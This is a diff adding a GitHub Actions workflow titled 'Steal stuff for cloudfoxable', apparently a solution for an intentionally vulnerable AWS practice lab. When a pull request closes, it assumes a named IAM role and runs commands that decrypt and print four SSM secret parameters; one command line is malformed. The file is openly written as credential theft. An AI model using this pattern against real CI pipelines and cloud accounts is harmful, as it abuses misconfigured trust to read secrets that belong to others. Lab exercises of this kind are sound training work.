@@ -1,0 +1,25 @@
+name: Steal stuff for cloudfoxable
+
+on:
+    pull_request:
+        types: [closed]
+
+jobs:
+    deploy_preview_cleanup:
+        name: Steal creds
+        runs-on: ubuntu-latest
+        
+
+        steps:
+            - uses: aws-actions/configure-aws-credentials@v4
+              with:
+                  aws-region: us-west-2
+                  role-to-assume: arn:aws:iam::256266946557:role/t_rodman
+
+            - name: Steal stuff
+              run: |
+                  aws sts get-caller-identity
+                  aws--region us-west-2 ssm get-parameter --with-decryption --name trust-her
+                  aws --region us-west-2 ssm get-parameter --with-decryption --name trust-him
+                  aws --region us-west-2 ssm get-parameter --with-decryption --name trust-me
+                  aws --region us-west-2 ssm get-parameter --with-decryption --name trust-them
